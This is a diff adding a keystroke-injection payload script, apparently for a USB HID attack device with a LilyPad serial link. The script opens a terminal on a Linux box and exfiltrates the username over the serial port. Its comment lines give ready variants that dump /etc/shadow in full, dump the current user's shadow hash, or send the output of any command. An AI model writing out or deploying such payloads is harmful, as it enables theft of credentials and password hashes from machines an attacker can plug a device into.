@@ -1,0 +1,16 @@
+Rem: Exfiltrate UserName from Linux Box using a Serial Link
+Rem: We need to set the DefaultDelay low and and use a delay higher than that right before the exfiltrated data
+DefaultDelay:50
+Press:134+195
+CustomDelay:1000
+PrintLine:gnome-terminal
+CustomDelay:1000
+Rem: Exfiltrate User and BlinkLED:3 when done
+PrintLine:sleep .5;stty -F /dev/serial/by-id/*LilyPad* 38400;echo -e "SerialEXFIL:"$(whoami)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*;exit
+Rem: -
+Rem: More examples below
+Rem: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad*
+Rem: In example below replace "LINUX COMMAND HERE": PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;sleep .5;echo -e "SerialEXFIL:"$(LINUX COMMAND HERE)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*
+Rem: Dump shadow file: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;sleep .5;echo -e "SerialEXFIL:"$(cat /etc/shadow)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*
+Rem: Dump shadow file for current user: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(cat /etc/shadow|grep $(whoami)) > /dev/serial/by-id/*LilyPad*
+Rem: Another way to access device: PrintLine:stty -F /dev/ttyACM0 38400;echo "SerialEXFIL:"$(whoami) > /dev/ttyACM0
